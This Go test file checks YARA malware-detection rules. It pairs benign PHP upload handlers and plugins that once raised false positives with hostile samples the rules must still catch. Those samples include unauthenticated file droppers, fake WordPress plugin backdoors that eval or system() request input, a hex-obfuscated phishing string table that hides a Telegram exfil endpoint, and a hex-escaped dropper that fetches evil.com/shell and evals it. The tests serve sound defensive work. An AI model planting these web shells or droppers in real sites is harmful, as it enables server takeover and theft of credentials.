//go:build yara

package yara

import (
	"bytes"
	"testing"
)

// Regression tests for the 2026-08-12 cluster triage. Every negative case
// below is a reconstruction of a file that produced a live false positive on
// production, and every positive case is the malicious shape the same rule
// must keep catching. The false positives mattered operationally: they buried
// a real bank-phishing kit under library and plugin noise.

// dropper_uploader_no_auth fired on framework upload handlers. The rule asked
// only for move_uploaded_file plus the absence of a small auth-token list, so
// any framework that gates uploads through its own ACL, or validates the
// upload instead of authenticating it, looked like an unauthenticated dropper.

func TestFPTriage_DropperUploader_MagentoAdminController(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
class Mage_Adminhtml_Extensions_FileController extends Mage_Adminhtml_Controller_Action
{
    public function uploadAction()
    {
        $tmpDir = Mage::getBaseDir('var') . DS . 'pkg';
        if (empty($_FILES['local']['tmp_name'])) {
            Mage::throwException($this->__('Invalid file upload attempt.'));
        }
        $pkg = $tmpDir . DS . $_FILES['local']['name'];
        move_uploaded_file($_FILES['local']['tmp_name'], $pkg);
        $this->_redirect('*/*/index');
    }

    protected function _isAllowed()
    {
        return Mage::getSingleton('admin/session')->isAllowed('system/extensions');
    }
}
`)
	if hasYaraRule(s.ScanBytes(legit), "dropper_uploader_no_auth") {
		t.Error("dropper_uploader_no_auth FP: matched a Magento admin controller whose upload is gated by the framework ACL (_isAllowed), not by a session_start/password token")
	}
}

func TestFPTriage_DropperUploader_ValidatedModuleUpload(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
class CategoryMap
{
    public function addMap($title)
    {
        if (empty($_FILES['map_file']['name']) || empty($title)) {
            return false;
        }
        if ($_FILES['map_file']['type'] != 'text/plain') {
            return false;
        }
        if (empty($_FILES['map_file']['size'])) {
            return false;
        }
        $name = ($this->getLastMapId() + 1) . '_' . $this->sanitizeName($_FILES['map_file']['name']);
        if (!move_uploaded_file($_FILES['map_file']['tmp_name'], $this->getFilePath($name))) {
            return false;
        }
        return true;
    }
}
`)
	if hasYaraRule(s.ScanBytes(legit), "dropper_uploader_no_auth") {
		t.Error("dropper_uploader_no_auth FP: matched a module uploader that validates MIME type and size before writing")
	}
}

func TestFPTriage_DropperUploader_ExtensionAllowlist(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
function file_extension($filename) {
	return end(explode(".", $filename));
}
$extensii = array('jpg', 'jpeg', 'gif', 'bmp', 'png');
if (isset($_FILES['uploadedfile']['name']) && !empty($_FILES['uploadedfile']['name'])) {
	$filename = basename($_FILES['uploadedfile']['name']);
	if (in_array(file_extension($filename), $extensii)) {
		$target_path = "../img_portal/" . $filename;
		if (!file_exists($target_path)) {
			move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
		}
	}
}
`)
	if hasYaraRule(s.ScanBytes(legit), "dropper_uploader_no_auth") {
		t.Error("dropper_uploader_no_auth FP: matched an image uploader restricted by an extension allowlist")
	}
}

func TestFPTriage_DropperUploader_RealDropperStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	for _, mal := range [][]byte{
		[]byte(`<?php if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],'./'.$_FILES['f']['name']);echo 'ok';}`),
		[]byte(`<?php @move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);`),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "dropper_uploader_no_auth") {
			t.Errorf("dropper_uploader_no_auth regression: unauthenticated arbitrary-file dropper not detected: %s", mal)
		}
	}
}

// webshell_wp_fake_plugin asked for the bare substring "system(", which is
// contained in WordPress's own WP_Filesystem(). Any plugin that called
// WP_Filesystem() and used base64_decode anywhere matched.

func TestFPTriage_FakePlugin_WPFilesystemSubstring(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`<?php
/*
Plugin Name: WP File Manager
Version: 7.2.7
*/
function fm_restore_backup($params) {
    WP_Filesystem();
    $id   = (int) base64_decode(trim($params["backup_id"]));
    $type = base64_decode(trim($params["type"]));
    return fm_do_restore($id, $type);
}
`)
	if hasYaraRule(s.ScanBytes(legit), "webshell_wp_fake_plugin") {
		t.Error(`webshell_wp_fake_plugin FP: "system(" matched inside WP_Filesystem(); a plugin decoding its own parameters is not a shell`)
	}
}

func TestFPTriage_FakePlugin_LegitToolingWithExec(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// WP-CLI ships plugin scaffolding text and genuinely runs system commands,
	// but never executes request input.
	legit := []byte(`<?php
/* Plugin Name: Scaffold Template */
class Command {
    public function run($args) {
        $out = shell_exec('wp core version');
        $cfg = base64_decode($this->stored_config);
        return array($out, $cfg);
    }
}
`)
	if hasYaraRule(s.ScanBytes(legit), "webshell_wp_fake_plugin") {
		t.Error("webshell_wp_fake_plugin FP: matched tooling that runs a fixed command and decodes its own stored config")
	}
}

func TestFPTriage_FakePlugin_RealBackdoorStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	for _, mal := range [][]byte{
		[]byte(`<?php /* Plugin Name: Akismet Anti-Spam */ eval(base64_decode($_POST['x']));`),
		[]byte(`<?php /* Plugin Name: SEO Helper */ system($_REQUEST['cmd']);`),
		[]byte(`<?php /* Plugin Name: Cache Tool */ @assert(stripslashes($_COOKIE['c']));`),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "webshell_wp_fake_plugin") {
			t.Errorf("webshell_wp_fake_plugin regression: fake plugin executing request input not detected: %s", mal)
		}
	}
}

// php_hex_escaped_url fired on TCPDF, which hex-escapes its own vanity URL
// (http://www.tcpdf.org) inside a ~900 KB library. The same rule caught a real
// bank-phishing kit whose entire body is a hex-escaped string table, so the
// fix must separate a stray escaped literal from an obfuscated payload.

func tcpdfLikeLibrary() []byte {
	var b bytes.Buffer
	b.WriteString("<?php\nclass TCPDF_STATIC {\n")
	// The vanity strings TCPDF really ships, hex-escaped by its author.
	b.WriteString("\tpublic static function getTCPDFProducer() {\n")
	b.WriteString("\t\treturn \"\\x54\\x43\\x50\\x44\\x46\\x20\".self::getTCPDFVersion().\"\\x20\\x28\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x74\\x63\\x70\\x64\\x66\\x2e\\x6f\\x72\\x67\\x29\";\n\t}\n")
	b.WriteString("\t$lnk = \"\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x74\\x63\\x70\\x64\\x66\\x2e\\x6f\\x72\\x67\";\n")
	// Bulk of a real library: ordinary PHP, including benign fetch helpers.
	body := "\tpublic function renderCell($x, $y, $w, $h, $txt) {\n\t\t$data = file_get_contents($this->cacheFile);\n\t\treturn $this->writeCell($x, $y, $w, $h, $txt, $data);\n\t}\n"
	for b.Len() < 900000 {
		b.WriteString(body)
	}
	b.WriteString("}\n")
	return b.Bytes()
}

func TestFPTriage_HexEscapedURL_LibraryVanityString(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes(tcpdfLikeLibrary()), "php_hex_escaped_url") {
		t.Error("php_hex_escaped_url FP: matched a large PDF library that hex-escapes its own project URL; a stray escaped literal in readable code is not an obfuscated payload")
	}
}

func TestFPTriage_HexEscapedURL_ObfuscatedExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	// Shape of the real phishing kit: a hex-escaped string table whose entries
	// include the exfil endpoint. Body is overwhelmingly escape sequences.
	var b bytes.Buffer
	b.WriteString(`var _$_149e=["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74",`)
	for i := 0; i < 300; i++ {
		b.WriteString(`"\x76\x61\x6c\x75\x65\x50\x61\x73\x73\x77\x6f\x72\x64",`)
	}
	b.WriteString(`"\x73\x65\x6e\x64"];`)
	if !hasYaraRule(s.ScanBytes(b.Bytes()), "php_hex_escaped_url") {
		t.Error("php_hex_escaped_url regression: hex-escaped string table hiding an exfil endpoint not detected")
	}

	// A small hand-written dropper is dense by construction and must stay caught.
	small := []byte(`<?php $u="\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d\x2f\x73\x68\x65\x6c\x6c"; eval(file_get_contents($u));`)
	if !hasYaraRule(s.ScanBytes(small), "php_hex_escaped_url") {
		t.Error("php_hex_escaped_url regression: small hex-escaped remote-include dropper not detected")
	}
}
